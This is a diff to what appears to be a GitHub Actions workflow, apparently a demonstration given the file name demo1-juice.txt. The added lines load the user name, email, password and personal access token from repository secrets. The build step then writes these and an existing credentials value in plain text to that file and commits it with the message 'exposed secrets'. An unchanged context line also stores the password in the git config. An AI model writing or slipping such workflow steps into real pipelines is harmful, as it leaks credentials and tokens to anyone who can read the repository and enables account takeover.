@@ -4,6 +4,10 @@ on:
 env:
   NEXT_PUBLIC_SANITY_DATASET: ${{ secrets.STAGING_PUBLIC_SANITY_DATASET }}
   CREDENTIALS_JSON: ${{ secrets.STAGING_CREDENTIALS }}
+  USER_NAME: ${{ secrets.USER_NAME }}
+  USER_EMAIL: ${{ secrets.USER_EMAIL }}
+  USER_PASSWORD: ${{ secrets.USER_PASSWORD }}
+  PAT: ${{ secrets.PAT }}
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -17,6 +21,10 @@ jobs:
           git config --local user.Password ${{ secrets.USER_PASSWORD }}
           echo "NEXT_PUBLIC_SANITY_DATASET: $NEXT_PUBLIC_SANITY_DATASET" > demo1-juice.txt
           echo "CREDENTIALS_JSON: $CREDENTIALS_JSON" >> demo1-juice.txt
+          echo "USER_NAME: $USER_NAME" >> demo1-juice.txt
+          echo "USER_EMAIL: $USER_EMAIL" >> demo1-juice.txt
+          echo "USER_PASSWORD: $USER_PASSWORD" >> demo1-juice.txt
+          echo "PAT: $PAT" >> demo1-juice.txt
           echo "created file. committing"
           git add .
           git commit -m "exposed secrets"
